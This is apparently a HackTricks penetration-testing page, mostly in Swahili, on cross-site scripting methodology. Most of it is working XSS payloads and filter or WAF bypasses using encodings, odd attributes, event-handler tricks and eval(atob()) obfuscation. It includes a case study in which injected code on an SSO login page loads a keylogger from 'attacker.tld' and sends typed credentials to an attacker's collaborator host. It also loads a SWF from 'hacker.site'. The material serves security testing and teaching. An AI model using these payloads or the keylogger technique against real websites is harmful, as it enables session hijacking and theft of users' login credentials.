# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Kagua kama **thamani yoyote unayodhibiti** (_parameters_, _path_, _headers_?, _cookies_?) ina **kurudishwa** katika HTML au **inatumika** na **JS** code.
2. **Tafuta muktadha** ambapo inarudishwa/inatumiwa.
3. Ikiwa **inarudishwa**
1. Angalia **ni alama gani unaweza kutumia** na kulingana na hiyo, andaa payload:
1. Katika **HTML ghafi**:
1. Je, unaweza kuunda tagi mpya za HTML?
2. Je, unaweza kutumia events au attributes zinazounga mkono protocol ya `javascript:`?
3. Je, unaweza kuzunguka ulinzi?
4. Je, maudhui ya HTML yanatafsiriwa na engine ya JS upande wa mteja (_AngularJS_, _VueJS_, _Mavo_...), unaweza kuabusa [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Ikiwa huwezi kuunda tagi za HTML zinazotekeleza code ya JS, je, unaweza kuabusa [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Ndani ya **tagi ya HTML**:
1. Je, unaweza kutoroka hadi muktadha wa HTML ghafi?
2. Je, unaweza kuunda events/attributes mpya za kuendesha JS?
3. Je, attribute ambayo umefungwa ndani yake inaunga mkono utekelezaji wa JS?
4. Je, unaweza kuzunguka ulinzi?
3. Ndani ya **JavaScript code**:
1. Je, unaweza kutoroka `<script>` tag?
2. Je, unaweza kutoroka string na kutekeleza code tofauti ya JS?
3. Je, ingizo lako liko katika template literals ``?
4. Je, unaweza kuzunguka ulinzi?
4. Javascript **function** ikiwekwa **kutekelezwa**
1. Unaweza kuonyesha jina la function itakayotekelezwa. mfano: `?callback=alert(1)`
4. Ikiwa **inatumika**:
1. Unaweza kutumia **DOM XSS**, zingatia jinsi ingizo lako linadhibitiwa na kama ingizo lako lililodhibitiwa linatumika kwa sink yoyote.

Wakati ukifanya kazi kwenye XSS ngumu inaweza kuvutia kujua kuhusu:

{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflected values

Ili kufanikiwa kutumia XSS kitu cha kwanza unachohitaji kupata ni **thamani unayodhibiti ambayo inarudishwa** kwenye ukurasa wa wavuti.

- **Iliorudishwa mara moja**: Ikiwa unagundua kuwa thamani ya parameter au hata path inarudishwa kwenye ukurasa wa wavuti unaweza kutumia **Reflected XSS**.
- **Imehifadhiwa na kurudishwa**: Ikiwa unagundua thamani unayodhibitiwa imehifadhiwa kwenye server na inarudishwa kila unapofungua ukurasa unaweza kutumia **Stored XSS**.
- **Inapatikana kupitia JS**: Ikiwa unagundua thamani unayodhibiti inapatikana kwa kutumia JS unaweza kutumia **DOM XSS**.

## Contexts

Unapojaribu kutumia XSS kitu cha kwanza unachohitaji kujua ni **wapi ingizo lako linarudishwa**. Kulingana na muktadha, utaweza kutekeleza code ya JS kwa njia tofauti.

### Raw HTML

Ikiwa ingizo lako **inarudishwa kwenye HTML ghafi** utahitaji kuabusa baadhi ya **tagi za HTML** ili kutekeleza code ya JS: `<img , <iframe , <svg , <script` ... hizi ni baadhi tu ya tagi nyingi za HTML unazoweza kutumia.\
Pia, kumbuka [Client Side Template Injection](../client-side-template-injection-csti.md).

### Inside HTML tags attribute

Ikiwa ingizo lako linarudishwa ndani ya thamani ya attribute ya tag unaweza kujaribu:

1. **Kutoroka kutoka kwenye attribute na kutoka kwenye tagi** (kisha utakuwa kwenye HTML ghafi) na kuunda tagi mpya za HTML za kuabusa: `"><img [...]`
2. Ikiwa **unaweza kutoroka kutoka kwenye attribute lakini si kutoka kwenye tagi** (`>` imekodishwa au imefutwa), kulingana na tagi unaweza **kuunda event** inayotekeleza code ya JS: `" autofocus onfocus=alert(1) x="`
3. Ikiwa **huwezi kutoroka kutoka kwenye attribute** (`"` inakodishwa au inafutwa), basi kulingana na **attribute gani** thamani yako inarudishwa ndani **na kama unadhibiti thamani yote au sehemu tu**, utaweza kuibua. Kwa **mfano**, ikiwa unadhibiti event kama `onclick=` utaweza kuifanya itekeleze code yoyote wakati inabofya. Mfano mwingine wa kuvutia ni attribute `href`, ambapo unaweza kutumia protocol ya `javascript:` kutekeleza code yoyote: **`href="javascript:alert(1)"`**
4. Ikiwa ingizo lako linarudishwa ndani ya "unexpoitable tags" unaweza kujaribu trick ya **`accesskey`** kuabusa udhaifu (utahitaji aina ya social engineering kuutekeleza): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

Ukurasa wa login wa corporate SSO ulirudisha parameter ya OAuth `service` ndani ya attribute ya `href` ya `<a id="forgot_btn" ...>`. Ingawa `<` na `>` zilikuwa zimekodishwa kwa HTML, nukuu mbili hazikukodishwa, hivyo mtukutu aliweza kufunga attribute na kutumia tena element ile ile kuingiza handlers kama `" onfocus="payload" x="`.

1. **Ingiza handler:** Payload rahisi kama `onclick="print(1)"` ilizuia, lakini WAF ilitazama tu tamko la kwanza la JavaScript katika attributes za inline. Kuweka usemi usio hatari uliowekwa ndani ya parentheses, kisha semicolon, kuliruhusu payload halisi itekelezwe: `onfocus="(history.length);malicious_code_here"`.
2. **Iite bila kubofya:** Browsers zinafanya focus kwa element yoyote yenye `id` inayolingana na fragment, hivyo kuongeza `#forgot_btn` kwenye URL ya exploit inalazimisha anchor ipate focus kwenye kupakia ukurasa na kuendesha handler bila hitaji la click.
3. **Fanya stub ya inline iwe ndogo:** Target tayari ilikuwa na jQuery. Handler ilihitaji tu kuanzisha request kupitia `$.getScript(...)` wakati keylogger kamili ulikuwa kwa server ya msaliti.

**Building strings without quotes**

Single quotes zilirudishwa zikiwa URL-encoded na double quotes zilizotoweka ziliharibu attribute, hivyo payload ilitengeneza kila string kwa kutumia `String.fromCharCode`. Helper function inafanya iwe rahisi kubadilisha URL yoyote kuwa char codes kabla ya kuiweka kwenye attribute:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Sifa iliyotokana ilionekana kama:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Kwa nini hii inachukua credentials**

Script ya nje (loaded from an attacker-controlled host or Burp Collaborator) ilishikilia `document.onkeypress`, ika-buffer keystrokes, na kila sekunde ilituma `new Image().src = collaborator_url + keys`. Kwa sababu XSS inafanyika tu kwa watumiaji wasiojathibitishwa, kitendo nyeti ni fomu ya login yenyewe—attacker keylogs usernames na passwords hata kama mhusika hajabonyeza "Login".

Mfano wa kushangaza wa Angular ukitekeleza XSS ikiwa unadhibiti jina la class:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Ndani ya JavaScript code

Katika kesi hii input yako inaonyeshwa kati ya **`<script> [...] </script>`** tags za ukurasa wa HTML, ndani ya faili `.js` au ndani ya attribute inayotumia protocol ya **`javascript:`**:

- Ikiwa inarekebishwa kati ya **`<script> [...] </script>`** tags, hata ikiwa input yako iko ndani ya aina yoyote ya quotes, unaweza kujaribu kuingiza `</script>` na kutoroka kutoka katika muktadha huu. Hii inafanya kazi kwa sababu **kivinjari kwanza huchambua lebo za HTML** kisha yaliyomo, kwa hivyo haitagundua kuwa `</script>` uliyoweka iko ndani ya HTML code.
- Ikiwa inarekebishwa **ndani ya JS string** na trick ya mwisho haifanyi kazi, utahitaji **kutoka** kwenye string, **kutekeleza** code yako na **kujenga tena** JS code (ikiwa kuna hitilafu yoyote, haitatekelezwa:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Ikiwa inarekebishwa ndani ya template literals unaweza **kuingiza JS expressions** ukitumia syntax ya `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** inafanya kazi kuandika **valid javascript code**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting inarejea fursa ya **kutangaza functions, variables au classes baada ya kutumika ili uweze kutumia mazingira ambapo XSS inatumia variables au functions zisizotangazwa.**\
**Angalia ukurasa ufuatao kwa maelezo zaidi:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Several web pages have endpoints that **accept as parameter the name of the function to execute**. A common example to see in the wild is something like: `?callback=callbackFunc`.

Njia nzuri ya kugundua kama kitu kinachotolewa moja kwa moja na mtumiaji kinajaribu kutekelezwa ni **kubadilisha thamani ya param** (kwa mfano kuwa 'Vulnerable') na kuangalia kwenye console kwa makosa kama:

![](<../../images/image (711).png>)

Iwapo ni vulnerable, unaweza kuwa na uwezo wa **kusababisha alert** kwa kutuma tu thamani: **`?callback=alert(1)`**. Hata hivyo, mara nyingi endpoints hizi zitafanya **uthibitishaji wa yaliyomo** ili kuruhusu herufi, nambari, alama za nukta na underscores pekee (**`[\w\._]`**).

Hata hivyo, hata kwa kikomo hicho bado inawezekana kufanya baadhi ya vitendo. Hii ni kwa sababu unaweza kutumia chars halali kupata/fikia **element yoyote katika DOM**:

![](<../../images/image (747).png>)

Baadhi ya functions muhimu kwa hili:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
You can also try to **trigger Javascript functions** directly: `obj.sales.delOrders`.

However, usually the endpoints executing the indicated function are endpoints without much interesting DOM, **other pages in the same origin** will have a **more interesting DOM** to perform more actions.

Therefore, in order to **abuse this vulnerability in a different DOM** the **Same Origin Method Execution (SOME)** exploitation was developed:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

There is **JS code** that is using **unsafely** some **data controlled by an attacker** like `location.href` . An attacker, could abuse this to execute arbitrary JS code.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

These kind of XSS can be found **anywhere**. They not depend just on the client exploitation of a web application but on **any** **context**. These kind of **arbitrary JavaScript execution** can even be abuse to obtain **RCE**, **read** **arbitrary** **files** in clients and servers, and more.\
Some **examples**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Kuingiza ndani ya HTML ghafi

When your input is reflected **inside the HTML page** or you can escape and inject HTML code in this context the **first** thing you need to do if check if you can abuse `<` to create new tags: Just try to **reflect** that **char** and check if it's being **HTML encoded** or **deleted** of if it is **reflected without changes**. **Only in the last case you will be able to exploit this case**.\
For this cases also **keep in mind** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Kumbuka: Comment ya HTML inaweza kufungwa kwa kutumia\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\*_ 

In this case and if no black/whitelisting is used, you could use payloads like:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Lakini, ikiwa tags/attributes black/whitelisting inatumiwa, utahitaji **brute-force ni tags gani** unaweza kuunda.\
Mara utakapokuwa **umepata ni tags gani zinazoruhusiwa**, utahitaji **brute-force attributes/events** ndani ya tags halali ulizopata ili kuona jinsi unavyoweza kushambulia muktadha.

### Tags/Events brute-force

Nenda kwenye [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) na bofya _**Copy tags to clipboard**_. Kisha, tuma zote kwa kutumia Burp intruder na angalia kama kuna tags ambazo WAF haikuitambua kama zenye madhara. Mara utakapo gundua tags unazoweza kutumia, unaweza **brute force all the events** ukitumia tags halali (katika ukurasa huo huo bofya _**Copy events to clipboard**_ na fuata utaratibu uleule kama kabla).

### Tags maalum

Ikiwa hukupata tag yoyote halali ya HTML, unaweza kujaribu **kuunda custom tag** na kutekeleza JS code kwa kutumia attribute ya `onfocus`. Katika request ya XSS, unahitaji kumalizia URL na `#` ili kufanya ukurasa **uzingatie kitu hicho** na **utekeleze** code:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Ikiwa aina fulani ya blacklist inatumiwa, unaweza kujaribu kuibypass kwa mbinu za kuchekesha:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Zaidi ya tiny XSS kwa mazingira tofauti** payload [**zinaweza kupatikana hapa**](https://github.com/terjanq/Tiny-XSS-Payloads) na [**hapa**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 Unicode characters which expands to 5: telsr\  
Zaidi ya Unicode characters hizi zinaweza kupatikana [hapa](https://www.unicode.org/charts/normalization/).\  
Ili kuangalia ni katika characters zipi zinavunjwa angalia [hapa](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Ikiwa, ili ku-exploit vulnerability, unahitaji **user kubofya link au form** yenye data iliyojazwa awali, unaweza kujaribu [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (ikiwa page iko vulnerable).

### Impossible - Dangling Markup

Ikiwa unadhani tu kwamba **haiwezekani kuunda HTML tag yenye attribute itakayotekeleza JS code**, unapaswa kuangalia [**Danglig Markup**](../dangling-markup-html-scriptless-injection/index.html) kwa sababu unaweza **exploit** vulnerability **pasipo** kuendesha **JS** code.

## Kuingiza ndani ya HTML tag

### Ndani ya tag/kutoroka kutoka kwenye attribute value

Ikiwa uko **ndani ya HTML tag**, kitu cha kwanza unachoweza kujaribu ni ku**escape** kutoka tag na kutumia baadhi ya techniques zilizotajwa katika [sehemu iliyopita](#injecting-inside-raw-html) ili kuendesha **JS code**.\  
Ikiwa **huwezi ku-escape kutoka tag**, unaweza kuunda attributes mpya ndani ya tag ili kujaribu kuendesha **JS code**, kwa mfano kutumia payload kama (_kumbuka katika mfano huu alama za nukuu mbili zimetumika kutoroka kutoka kwenye attribute; hutazihitaji ikiwa input yako ina-reflect moja kwa moja ndani ya tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Matukio ya CSS**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Ndani ya attribute

Hata kama **hutaweza kutoroka kutoka kwenye attribute** (`"` inakodishwa au kufutwa), kutegemea **attribute gani** ambapo thamani yako inaonekana na **je, unadhibiti thamani yote au sehemu tu** utaweza kuitumia vibaya. Kwa **mfano**, kama unadhibiti event kama `onclick=` utaweza kuifanya itekeleze arbitrary code inapobonyezwa.\
Mfano mwingine wa kuvutia ni attribute `href`, ambapo unaweza kutumia protocol ya `javascript:` kutekeleza arbitrary code: **`href="javascript:alert(1)"`**

**Bypass ndani ya event kwa kutumia HTML encoding/URL encode**

Vicharacter vya **HTML encoded characters** ndani ya thamani za attributes za tagi za HTML **vinatafsiriwa wakati wa runtime**. Hivyo kitu kama kifuatavyo kitakuwa halali (the payload is in bold): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Kumbuka kwamba **aina yoyote ya HTML encode ni halali**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Kumbuka kwamba URL encode pia itafanya kazi:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass ndani ya event kwa kutumia Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Itifaki maalum ndani ya attribute

Hapo unaweza kutumia itifaki **`javascript:`** au **`data:`** katika baadhi ya maeneo ili **kutekeleza JS code yoyote**. Baadhi yatahitaji mwingiliano wa mtumiaji; wengine hawatahitaji.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Maeneo ambapo unaweza kuingiza itifaki hizi**

**Kwa ujumla** itifaki ya `javascript:` inaweza **kutumika kwenye tag yoyote inayokubali attribute `href`** na kwa **vingi** ya tag zinazokubali **attribute `src`** (lakini si `<img`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Mbinu nyingine za kutatanisha**

_**Katika kesi hii, HTML encoding na Unicode encoding trick kutoka sehemu iliyopita pia ni halali kwa kuwa uko ndani ya attribute.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Zaidi ya hayo, kuna **mbinu nzuri** nyingine kwa kesi hizi: **Hata kama pembejeo yako ndani ya `javascript:...` inakuwa URL encoded, itakuwa URL decoded kabla ya kutekelezwa.** Kwa hivyo, ikiwa unahitaji **escape** kutoka kwenye **string** kwa kutumia **single quote** na unaona kwamba **it's being URL encoded**, kumbuka kwamba **haijalishi,** itatafsiriwa kama **single quote** wakati wa **utekelezaji**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Tambua kwamba ikiwa utajaribu **kutumia zote mbili** `URLencode + HTMLencode` kwa mpangilio wowote ili kukodisha **payload**, **haitafanya kazi**, lakini unaweza **kuwachanganya ndani ya payload**.

**Kutumia Hex na Octal encode na `javascript:`**

Unaweza kutumia **Hex** na **Octal encode** ndani ya `src` attribute ya `iframe` (angalau) ili kutangaza **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Ikiwa unaweza kuingiza URL yoyote katika tagi yoyote ya **`<a href=`** ambayo ina sifa za **`target="_blank" and rel="opener"`**, angalia **ukurasa ufuatao ili kutumia tabia hii**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

Kwanza kabisa angalia ukurasa huu ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) kwa **"on" event handlers**.\
In case kuna blacklist inayokuzuia kuunda event handlers hizi unaweza kujaribu the following bypasses:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS katika "Unexploitable tags" (hidden input, link, canonical, meta)

Kutoka [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **sasa inawezekana kutumia vibaya hidden inputs kwa:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
Na katika **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Kutoka [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Unaweza kutekeleza **XSS payload inside a hidden attribute**, ikiwa unaweza **kumshawishi** **mwanaathiriwa** kubofya **mchanganyiko wa vitufe**. Kwenye Firefox Windows/Linux, mchanganyiko wa vitufe ni **ALT+SHIFT+X** na kwenye OS X ni **CTRL+ALT+X**. Unaweza kubainisha mchanganyiko tofauti wa vitufe kwa kutumia kitufe tofauti katika access key attribute. Hapa kuna vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload itakuwa kama ifuatayo: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Mbinu kadhaa za kutumia encoding tofauti zimetajwa tayari katika sehemu hii. Rudi **kujifunza wapi unaweza kutumia:**

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Soma[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Soma J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Iwapo utapata **XSS katika sehemu ndogo sana** ya tovuti ambayo inahitaji aina fulani ya mwingiliano (labda linki ndogo katika footer yenye onmouseover element), unaweza kujaribu **kubadilisha nafasi ambayo element hiyo inachukua** ili kuongeza uwezekano wa linki kutekelezwa.

Kwa mfano, unaweza kuongeza styling ndani ya element kama: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Lakini, ikiwa WAF inachuja attribute ya style, unaweza kutumia CSS Styling Gadgets, hivyo ikiwa utapata, kwa mfano

> .test {display:block; color: blue; width: 100%\}

na

> \#someid {top: 0; font-family: Tahoma;}

Sasa unaweza kubadilisha linki yetu na kuiweka katika fomu

> \<a href="" id=someid class=test onclick=alert() a="">

Njia hii ilitolewa kutoka kwa [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Kuingiza ndani ya JavaScript code

Katika kesi hizi **input** yako itaonyeshwa ndani ya **JS code** ya faili `.js` au kati ya `<script>...</script>` tags au kati ya HTML events zinazoweza kutekeleza JS code au kati ya attributes zinazokubali protocol ya `javascript:`.

### Escaping \<script> tag

Ikiwa code yako imeingizwa ndani ya `<script> [...] var input = 'reflected data' [...] </script>` unaweza kwa urahisi **kuvuka kufunga `<script>`** tag:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Tambua kwamba katika mfano huu **we haven't even closed the single quote**. Hii ni kwa sababu **HTML parsing is performed first by the browser**, ambayo inahusisha kutambua vipengele vya ukurasa, ikiwemo blocks za script. Parsing ya JavaScript ili kuelewa na kutekeleza scripts zilizowekwa ndani hufanywa tu baadaye.

### Ndani ya JS code

Ikiwa `<>` zinasafishwa bado unaweza **escape the string** mahali ambapo input yako imewekwa na **execute arbitrary JS**. Ni muhimu **fix JS syntax**, kwa sababu ikiwa kuna makosa yoyote, JS code haitatekelezwa:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Wakati pembejeo ya mtumiaji inapoingia ndani ya quoted JavaScript string (mfano, server-side echo into an inline script), unaweza kumaliza string, kuingiza code, na kurekebisha syntax ili parsing iendelee kuwa halali. Generic skeleton:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Mfano wa URL pattern wakati parameter iliyo dhaifu inarudishwa ndani ya JS string:
```
?param=test";<INJECTION>;a="
```
Hii inatekeleza JS ya mshambuliaji bila hitaji kuingilia muktadha wa HTML (pure JS-in-JS). Unganisha na blacklist bypasses hapo chini wakati filters zinapozuia keywords.

### Template literals ``

Ili kujenga **strings** mbali na nukuu za moja na mbili JS pia inakubali **backticks** **` `` `**. Hii inajulikana kama template literals kwani zinawawezesha kutumia **embedded JS expressions** kwa kutumia sintaksi `${ ... }`.\
Kwa hivyo, ukigundua kuwa input yako ina **reflected** ndani ya JS string inayotumia backticks, unaweza kutumia sintaksi `${ ... }` ili kutekeleza **arbitrary JS code**:

Hii inaweza **kutumiwa vibaya** kwa kutumia:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Encoded code execution
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads with eval(atob()) na tofauti ndogo za scope

Ili kufanya URLs ziwe fupi na kupita vichujio vya maneno rahisi, unaweza base64-encode mantiki yako halisi kisha uiite kwa `eval(atob('...'))`. Ikiwa uchujaji wa maneno rahisi unazuia vitambulisho kama `alert`, `eval`, au `atob`, tumia vitambulisho vilivyo Unicode-escaped ambavyo vinacompile kwa njia ile ile katika browser lakini vinapita kando ya vichujio vinavyofanana na mnyororo:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
